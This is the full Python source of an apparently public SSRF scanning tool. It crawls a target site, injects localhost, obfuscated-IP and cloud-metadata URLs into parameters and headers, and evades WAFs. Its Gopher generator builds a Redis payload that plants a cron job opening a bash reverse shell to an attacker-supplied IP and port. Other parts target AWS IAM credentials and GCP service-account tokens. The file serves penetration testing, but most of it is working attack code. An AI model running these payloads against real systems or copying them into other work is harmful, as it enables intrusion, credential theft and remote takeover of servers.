# -*- coding: utf-8 -*-
"""
SSRF-Scanner V0.0.3
The most comprehensive single-file SSRF detection suite.

Features:
- Multi-Threaded Scanning Engine
- Circuit Breaker (Anti-Ban System)
- Recursive Crawler (Same-Domain)
- Gopher Payload Generator (Redis, MySQL, SMTP, FastCGI)
- Advanced WAF Evasion (Unicode, Encodings, Obfuscation)
- Cloud Metadata Extraction (AWS, GCP, Azure, Oracle, Alibaba, DO, OpenStack)
- HTML/JSON/CSV/TXT Reporting
- Raw cURL Parsing
- Heuristic Technology Detection
"""

# pylint: disable=too-many-lines,broad-except,too-many-instance-attributes
# pylint: disable=too-many-arguments,too-many-branches,too-many-statements

import argparse
import base64
import csv
import html
import json
import logging
import os
import queue
import random
import re
import shlex
import socket
import sys
import threading
import time
import difflib
from abc import ABC, abstractmethod
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from threading import Thread, Lock
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import quote, unquote, urljoin, urlparse, parse_qs

# Third-party imports
try:
    import colorama
    import requests
    import urllib3
    from colorama import Fore, Style, Back
    from requests.adapters import HTTPAdapter, Retry
    from requests.exceptions import (ConnectionError as RequestsConnectionError,
                                     RequestException, Timeout, TooManyRedirects)
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Please install: pip install requests colorama")
    sys.exit(1)

# Init
colorama.init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = 'version 0.0.3'

# --- CONSTANTS & CONFIGURATION ---

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
    'AWS WAF': ['x-amzn-requestid', 'x-amz-id-2'],
    'Akamai': ['x-akamai-transformed', 'akamai-origin-hop'],
    'F5 BigIP': ['x-cnection', 'bigipserver'],
    'Imperva': ['x-cdn', 'incap-ses']
}

CLOUD_METADATA_URLS = {
    'AWS': [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    ],
    'GCP': [
        'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token',
        'http://169.254.169.254/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true'
    ],
    'Azure': [
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-08-01&format=text'
    ],
    'Oracle': [
        'http://169.254.169.254/opc/v1/instance/',
        'http://169.254.169.254/opc/v2/instance/'
    ],
    'Alibaba': [
        'http://100.100.100.200/latest/meta-data/',
        'http://100.100.100.200/latest/user-data'
    ],
    'DigitalOcean': [
        'http://169.254.169.254/metadata/v1/'
    ],
    'OpenStack': [
        'http://169.254.169.254/openstack/latest/meta_data.json'
    ],
    'Kubernetes': [
        'https://kubernetes.default.svc.cluster.local'
    ]
}

# --- HELPER FUNCTIONS ---

def safe_header_value(value: Any) -> Optional[str]:
    """Ensures header values are latin-1 compatible (HTTP standard)."""
    try:
        if isinstance(value, bytes):
            value = value.decode('utf-8', errors='ignore')
        value = str(value)
        value.encode('latin-1')
        return value.replace('\n', '').replace('\r', '')
    except (UnicodeEncodeError, Exception):
        return None

def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
  ███████╗███████╗██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
  ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ███████╗███████╗██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ╚════██║╚════██║██╔══██╗██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
  ███████║███████║██║  ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"  {__version__} by RuslanSemchenko")
    print(Fore.YELLOW + "  [WRN] Use with caution. You are responsible for your actions.")
    print(Fore.YELLOW + "  [WRN] Developers assume no liability for misuse.\n")

# --- CORE CLASSES ---

class Config:
    """Central configuration storage."""
    def __init__(self):
        self.options = {
            'threads': 15,
            'timeout': 6,
            'retry_count': 1,
            'debug': False,
            'verify_ssl': False,
            'follow_redirects': True,
            'max_redirects': 3,
            'output_dir': "ssrf_reports",
            'user_agent': "SSRF-Scanner/0.0.4",
            'max_pool_size': 100,
            'capture_cookies': True,
            'crawl_depth': 2,
            'generate_gopher': True
        }

    def get(self, key, default=None):
        return self.options.get(key, default)

    def set(self, key, value):
        self.options[key] = value

@dataclass
class ScanResult:
    """Data object for a single scan result."""
    url: str
    attack_type: str
    payload: str
    response_code: int
    response_size: int
    timestamp: datetime
    headers: Dict[str, str]
    is_vulnerable: bool
    verification_method: str = ""
    notes: str = ""
    severity: str = "Medium"

# --- GOPHER PAYLOAD GENERATOR ---

class GopherGenerator:
    """Advanced engine to construct Gopher payloads."""
    
    @staticmethod
    def _encode_gopher(payload: str) -> str:
        return quote(quote(payload))

    def redis_shell(self, host: str, port: int, reverse_ip: str, reverse_port: int) -> str:
        cmd = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1\n\n"
        commands = [
            "flushall",
            f"set 1 {cmd.replace(' ', '${IFS}')}", 
            "config set dir /var/spool/cron/",
            "config set dbfilename root",
            "save",
            "quit"
        ]
        stream = ""
        for command in commands:
            parts = command.split(' ')
            stream += f"*{len(parts)}\r\n"
            for part in parts:
                stream += f"${len(part)}\r\n{part}\r\n"
        return f"gopher://{host}:{port}/_{quote(stream)}"

    def redis_basic(self, host: str = "127.0.0.1", port: int = 6379) -> str:
        stream = "*1\r\n$4\r\nINFO\r\n"
        return f"gopher://{host}:{port}/_{quote(stream)}"

    def smtp_mail(self, host: str, port: int, to_addr: str, subject: str) -> str:
        commands = [
            f"MAIL FROM:<ssrf@{host}>",
            f"RCPT TO:<{to_addr}>",
            "DATA",
            f"Subject: {subject}",
            "",
            "SSRF Test",
            ".",
            "QUIT"
        ]
        stream = "\r\n".join(commands) + "\r\n"
        return f"gopher://{host}:{port}/_{quote(stream)}"

    def http_post(self, host: str, port: int, path: str, body: str) -> str:
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "\r\n"
            f"{body}"
        )
        return f"gopher://{host}:{port}/_{quote(req)}"

# --- ADVANCED PAYLOAD MUTATOR ---

class PayloadMutator:
    """Transforms basic IPs into advanced obfuscated formats."""
    
    def __init__(self):
        self.gopher = GopherGenerator()

    def generate_ip_variations(self, ip: str) -> List[str]:
        variations = set()
        variations.add(ip)

        if ip in ['127.0.0.1', 'localhost']:
            variations.add('[::ffff:127.0.0.1]')
            variations.add('[::ffff:7f00:1]')
            variations.add('127.1')
            variations.add('0177.0.0.1')
            variations.add('0x7f.0.0.1')
            variations.add('2130706433')
            variations.add('0x7f000001')
            variations.add('①②⑦.⓪.⓪.①')
            variations.add('①②⑦.①')
            variations.add('ⓛⓞⓒⓐⓛⓗⓞⓢⓣ')
            variations.add('localhost%00')
            variations.add('127.0.0.1%09')
            variations.add('localtest.me')
            variations.add('customer-k8s.local')
            variations.add('metadata.google.internal')
            variations.add('169.254.169.254')
            variations.add('[fd00:ec2::254]') 

        if ip in ['127.0.0.1', 'localhost']:
            variations.add(self.gopher.redis_basic())
        
        final_list = set()
        for v in variations:
            final_list.add(v)
            final_list.add(quote(v))
            final_list.add(quote(quote(v)))
            
        return list(final_list)

    def generate_scheme_variations(self, url_payload: str) -> List[str]:
        variations = []
        variations.append(f"file://{url_payload}")
        variations.append(f"dict://{url_payload}")
        variations.append(f"ldap://{url_payload}")
        variations.append(f"tftp://{url_payload}")
        variations.append(f"netdoc://{url_payload}")
        if '/' not in url_payload:
            variations.append(f"php://filter/convert.base64-encode/resource={url_payload}")
        return variations

# --- REPORTING ENGINE ---

class HTMLReporter:
    """Generates a standalone HTML dashboard."""
    
    @staticmethod
    def generate(results: List[ScanResult], output_file: Path):
        vulns = [r for r in results if r.is_vulnerable]
        scan_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html_template = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>SSRF-Scanner Report</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e24; color: #e2e2e2; margin: 0; }}
                .container {{ width: 90%; margin: 20px auto; }}
                .header {{ background: #2a2a35; padding: 20px; border-radius: 8px; border-bottom: 4px solid #00d2d3; }}
                .stats {{ display: flex; gap: 20px; margin-top: 20px; }}
                .card {{ background: #2a2a35; padding: 20px; border-radius: 8px; flex: 1; text-align: center; }}
                .number {{ font-size: 2.5em; font-weight: bold; color: #00d2d3; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 30px; background: #2a2a35; border-radius: 8px; overflow: hidden; }}
                th, td {{ padding: 12px 15px; text-align: left; border-bottom: 1px solid #444; }}
                th {{ background: #00d2d3; color: white; }}
                tr:hover {{ background: #3a3a45; }}
                .vuln {{ color: #ff6b81; font-weight: bold; }}
                .safe {{ color: #2ed573; }}
                code {{ background: #111; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #7bed9f; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>SSRF-Scanner Report</h1>
                    <p>Generated: {scan_date} | {__version__}</p>
                </div>
                
                <div class="stats">
                    <div class="card">
                        <div class="number">{len(results)}</div>
                        <div>Total Requests</div>
                    </div>
                    <div class="card">
                        <div class="number">{len(vulns)}</div>
                        <div>Vulnerabilities Found</div>
                    </div>
                    <div class="card">
                        <div class="number">{len(set(r.url for r in results))}</div>
                        <div>Unique URLs</div>
                    </div>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Target URL</th>
                            <th>Payload</th>
                            <th>Type</th>
                            <th>Verification</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
        """
        
        rows = ""
        for idx, res in enumerate(vulns):
            rows += f"""
                        <tr>
                            <td>{idx + 1}</td>
                            <td>{html.escape(res.url)}</td>
                            <td><code>{html.escape(res.payload)}</code></td>
                            <td>{res.attack_type}</td>
                            <td>{res.verification_method}</td>
                            <td class="vuln">CRITICAL</td>
                        </tr>
            """
            
        footer = """
                    </tbody>
                </table>
            </div>
        </body>
        </html>
        """
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_template + rows + footer)


class Reporter:
    """Manages all reporting formats."""
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.results: List[ScanResult] = []
        
        self.files = {
            'txt': self.output_dir / 'report.txt',
            'csv': self.output_dir / 'report.csv',
            'json': self.output_dir / 'report.json',
            'html': self.output_dir / 'dashboard.html'
        }

    def add_result(self, result: ScanResult):
        self.results.append(result)
        if result.is_vulnerable:
            self.save_txt(result)
            self.save_csv(result)
            self.save_json() 
            
    def save_txt(self, res: ScanResult):
        with open(self.files['txt'], 'a', encoding='utf-8') as f:
            f.write(f"[{res.timestamp}] VULNERABLE: {res.url}\n")
            f.write(f"  Type: {res.attack_type}\n")
            f.write(f"  Payload: {res.payload}\n")
            f.write(f"  Method: {res.verification_method}\n")
            f.write(f"  Notes: {res.notes}\n\n")

    def save_csv(self, res: ScanResult):
        exists = self.files['csv'].exists()
        with open(self.files['csv'], 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            if not exists:
                w.writerow(['Timestamp', 'URL', 'Type', 'Payload', 'Code', 'Verification'])
            w.writerow([res.timestamp, res.url, res.attack_type, res.payload, res.response_code, res.verification_method])

    def save_json(self):
        data = [
            {
                'url': r.url,
                'type': r.attack_type,
                'payload': r.payload,
                'vuln': r.is_vulnerable,
                'details': r.notes
            }
            for r in self.results if r.is_vulnerable
        ]
        with open(self.files['json'], 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)

    def finalize(self):
        HTMLReporter.generate(self.results, self.files['html'])
        vulns = [r for r in self.results if r.is_vulnerable]
        print(f"\n{Fore.GREEN}[*] Reports Saved:{Style.RESET_ALL}")
        print(f"  HTML: {self.files['html']}")
        print(f"  JSON: {self.files['json']}")
        print(f"  TXT:  {self.files['txt']}")
        return len(vulns)

# --- SCANNER LOGIC ---

class TechnologyDetector:
    """Analyzes response headers to detect backend stack."""
    @staticmethod
    def detect(headers: Dict[str, str]) -> List[str]:
        tags = []
        server = headers.get('Server', '').lower()
        powered = headers.get('X-Powered-By', '').lower()
        if 'nginx' in server: tags.append('Nginx')
        if 'apache' in server: tags.append('Apache')
        if 'iis' in server or 'asp' in powered: tags.append('IIS')
        if 'php' in powered: tags.append('PHP')
        if 'java' in powered or 'tomcat' in server or 'jetty' in server: tags.append('Java')
        return tags

class SSRFScanner:
    """Main scanning engine."""
    
    def __init__(self, config: Config):
        banner()
        self.cfg = config
        self.session = self._init_session()
        self.reporter = Reporter(self.cfg.get('output_dir'))
        self.mutator = PayloadMutator()
        
        self.q = queue.Queue()
        self.scanned_urls = set()
        self.lock = Lock()
        self.stop_event = threading.Event()
        
        self.stats = { 'requests': 0, 'errors': 0, 'vulns': 0 }
        self.payloads = self._load_payloads()

    def _init_session(self) -> requests.Session:
        s = requests.Session()
        retries = Retry(
            total=self.cfg.get('retry_count'),
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(
            max_retries=retries,
            pool_connections=self.cfg.get('max_pool_size'),
            pool_maxsize=self.cfg.get('max_pool_size')
        )
        s.mount('http://', adapter)
        s.mount('https://', adapter)
        s.verify = self.cfg.get('verify_ssl')
        return s

    def _load_payloads(self) -> Dict[str, List[str]]:
        return {
            'params': [
                'url', 'uri', 'link', 'dest', 'redirect', 'source', 'path', 
                'site', 'callback', 'return', 'page', 'feed', 'host', 'port', 
                'to', 'out', 'view', 'file', 'document', 'folder', 'root', 
                'img', 'reference', 'html', 'val', 'validate', 'domain'
            ],
            'headers': [
                'X-Forwarded-For', 'X-Real-Ip', 'Referer', 'X-Originating-IP', 
                'Host', 'X-Host', 'X-Forwarded-Host', 'X-ProxyUser-Ip', 'Client-IP',
                'X-Wap-Profile', 'Profile', 'X-Arbitrary'
            ]
        }

    def _get_ua(self) -> str:
        return random.choice(USER_AGENTS)

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        for waf, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in response.headers or sig in response.text.lower():
                    return waf
        if response.status_code == 403:
            return "Generic WAF (403)"
        return None

    def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        headers = kwargs.get('headers', {})
        headers['User-Agent'] = self._get_ua()
        kwargs['headers'] = headers
        
        # DEBUG MODE: PRINT EVERY REQUEST
        if self.cfg.get('debug'):
            print(f"{Fore.CYAN}[DEBUG] {method} {url}{Style.RESET_ALL}")

        try:
            with self.lock:
                self.stats['requests'] += 1
            
            resp = self.session.request(
                method, 
                url, 
                timeout=self.cfg.get('timeout'), 
                allow_redirects=self.cfg.get('follow_redirects'),
                **kwargs
            )
            return resp
        except RequestException as e:
            if self.cfg.get('debug'):
                print(f"{Fore.RED}[DEBUG] Error: {e}{Style.RESET_ALL}")
            with self.lock:
                self.stats['errors'] += 1
            return None

    def analyze_response(self, original: requests.Response, test: requests.Response) -> Tuple[bool, str]:
        if not test:
            return False, "No Response"

        if original.status_code != test.status_code:
            if test.status_code not in [429, 503]:
                return True, f"Status Code: {original.status_code} -> {test.status_code}"

        def clean(t):
            t = re.sub(r'\d+', '', t)
            t = re.sub(r'[a-f0-9]{16,}', '', t)
            return t

        orig_clean = clean(original.text)
        test_clean = clean(test.text)
        matcher = difflib.SequenceMatcher(None, orig_clean, test_clean)
        ratio = matcher.ratio()

        if ratio < 0.85: 
            return True, f"Content Similarity: {ratio:.2f}"
            
        if test.elapsed.total_seconds() - original.elapsed.total_seconds() > 4.0:
            return True, "Time Delay > 4s"

        return False, ""

    def verify_vulnerability(self, payload: str, response: requests.Response) -> str:
        text = response.text.lower()
        signatures = {
            'Root User': r'root:x:0:0:',
            'Windows Boot': r'\[extensions\]|\[fonts\]',
            'AWS Meta': r'ami-id|instance-id',
            'GCP Meta': r'metadata-flavor:\s*google',
            'K8s Secret': r'default:x:\d+:\d+',
            'Oracle Meta': r'opc/v1/instance',
            'Internal Error': r'connection refused|network unreachable',
            'PHP Info': r'php version',
        }
        for name, sig in signatures.items():
            if re.search(sig, text):
                return f"Signature Match: {name}"
        for h in response.headers:
            if 'amazon' in h or 'google' in h or 'oracle' in h:
                return f"Cloud Header Found: {h}"
        return "Heuristic Match (Manual Verification Needed)"

    def crawl(self, url: str, depth: int = 0):
        if depth > self.cfg.get('crawl_depth') or url in self.scanned_urls:
            return
        
        self.scanned_urls.add(url)
        resp = self.make_request(url)
        if not resp or 'text/html' not in resp.headers.get('Content-Type', ''):
            return

        links = re.findall(r'href=["\'](http[^"\']+|/[^"\']+)["\']', resp.text)
        parsed_root = urlparse(url)
        
        for link in links:
            full_link = urljoin(url, link)
            parsed_link = urlparse(full_link)
            
            if parsed_link.netloc == parsed_root.netloc:
                if '?' in full_link:
                    self.q.put(full_link)
                self.crawl(full_link, depth + 1)

    def attack_target(self, url: str):
        # Если включен дебаг - не используем \r, чтобы лог шел вниз
        if self.cfg.get('debug'):
            print(f"{Fore.BLUE}[*] Analyzing: {url}{Style.RESET_ALL}")
        else:
            print(f"\r{Fore.BLUE}[*] Analyzing: {url}{Style.RESET_ALL}", end='')
        
        original = self.make_request(url)
        if not original:
            return

        waf = self._detect_waf(original)
        if waf and self.cfg.get('debug'):
            print(f"{Fore.YELLOW}[!] WAF Detected: {waf} on {url}{Style.RESET_ALL}")

        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        
        params_to_test = list(qs.keys()) + self.payloads['params']
        targets = self.mutator.generate_ip_variations("127.0.0.1")
        for cloud, urls in CLOUD_METADATA_URLS.items():
            targets.extend(urls)
            
        backurl = self.cfg.get('backurl')
        if backurl:
            targets.append(f"{backurl}?id=PARAM_TEST")

        sep = '&' if '?' in url else '?'

        for param in params_to_test:
            for payload in targets:
                if param in qs:
                    test_url = url.replace(f"{param}={qs[param][0]}", f"{param}={quote(payload)}")
                else:
                    test_url = f"{url}{sep}{param}={quote(payload)}"
                
                resp = self.make_request(test_url)
                if not resp: continue
                
                is_vuln, reason = self.analyze_response(original, resp)
                if is_vuln:
                    verification = self.verify_vulnerability(payload, resp)
                    if "Manual" in verification and "Time" not in reason and float(reason.split(':')[-1]) > 0.8:
                        continue
                    self.report_vuln(test_url, "Parameter Injection", payload, resp, verification, reason)

        for header in self.payloads['headers']:
            for payload in targets[:10]: 
                headers = {header: safe_header_value(payload)}
                resp = self.make_request(url, headers=headers)
                if resp:
                    is_vuln, reason = self.analyze_response(original, resp)
                    if is_vuln:
                         verification = self.verify_vulnerability(payload, resp)
                         if "Manual" not in verification: 
                             self.report_vuln(url, f"Header: {header}", payload, resp, verification, reason)

    def report_vuln(self, url, type_, payload, resp, verify, note):
        print(f"\n{Fore.RED}[!] VULNERABILITY FOUND: {url}{Style.RESET_ALL}")
        print(f"    Type: {type_}")
        print(f"    Payload: {payload}")
        print(f"    Verify: {verify}")
        res = ScanResult(
            url=url, attack_type=type_, payload=payload,
            response_code=resp.status_code, response_size=len(resp.content),
            timestamp=datetime.now(), headers=dict(resp.headers),
            is_vulnerable=True, verification_method=verify, notes=note
        )
        self.reporter.add_result(res)

    def worker(self):
        while not self.stop_event.is_set():
            try:
                url = self.q.get(timeout=1)
                self.attack_target(url)
                self.q.task_done()
            except queue.Empty:
                break
            except Exception as e:
                if self.cfg.get('debug'):
                    print(f"Worker Error: {e}")

    def run(self, input_data: Union[str, List[str]]):
        if isinstance(input_data, str): 
            if os.path.isfile(input_data):
                with open(input_data, 'r') as f:
                    for line in f:
                        if line.strip(): self.q.put(line.strip())
            else:
                self.q.put(input_data)
                print(f"{Fore.CYAN}[*] Auto-crawling single target...{Style.RESET_ALL}")
                self.crawl(input_data)
        elif isinstance(input_data, list):
            for u in input_data: self.q.put(u)

        print(f"{Fore.GREEN}[+] Starting scan with {self.cfg.get('threads')} threads...{Style.RESET_ALL}")
        
        threads = []
        for _ in range(self.cfg.get('threads')):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            self.q.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted. Saving results...{Style.RESET_ALL}")
            self.stop_event.set()

        self.reporter.finalize()

def parse_curl_command(command: str) -> Dict[str, Any]:
    try:
        tokens = shlex.split(command)
        url = None
        method = "GET"
        headers = {}
        data = None
        cookies = {}
        for i, token in enumerate(tokens):
            if token.startswith("http"): url = token
            elif token in ("-H", "--header"):
                key, value = tokens[i+1].split(":", 1)
                headers[key.strip()] = value.strip()
            elif token in ("-X", "--request"): method = tokens[i+1].upper()
            elif token in ("-d", "--data", "--data-raw"): data = tokens[i+1]
            elif token in ("-b", "--cookie"):
                cookie_str = tokens[i+1]
                for cookie in cookie_str.split(";"):
                    if "=" in cookie:
                        k, v = cookie.split("=", 1)
                        cookies[k.strip()] = v.strip()
        return { "url": url, "method": method, "headers": headers, "data": data, "cookies": cookies }
    except Exception as e:
        print(f"Error parsing CURL: {e}")
        return {}

def main():
    parser = argparse.ArgumentParser(description="SSRF-Scanner - Advanced Scanning Suite")
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-u", "--url", help="Target URL")
    input_group.add_argument("-f", "--file", help="List of URLs")
    input_group.add_argument("--curl", help="Raw cURL command (quoted)")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Threads (def: 15)")
    parser.add_argument("-b", "--backurl", help="Blind SSRF Callback URL")
    parser.add_argument("--timeout", type=int, default=6, help="Timeout sec")
    parser.add_argument("--debug", action="store_true", help="Verbose mode")
    parser.add_argument("--no-crawl", action="store_true", help="Disable crawler")
    args = parser.parse_args()

    cfg = Config()
    cfg.set('threads', args.threads)
    cfg.set('timeout', args.timeout)
    cfg.set('debug', args.debug)
    cfg.set('backurl', args.backurl)
    if args.no_crawl: cfg.set('crawl_depth', 0)

    scanner = SSRFScanner(cfg)

    if args.curl:
        req_data = parse_curl_command(args.curl)
        if req_data.get('url'):
            print(f"{Fore.GREEN}[+] Loaded from cURL: {req_data['url']}{Style.RESET_ALL}")
            scanner.run(req_data['url'])
        else: print("Invalid cURL command")
    else:
        target = args.url if args.url else args.file
        scanner.run(target)

if __name__ == "__main__":
    main()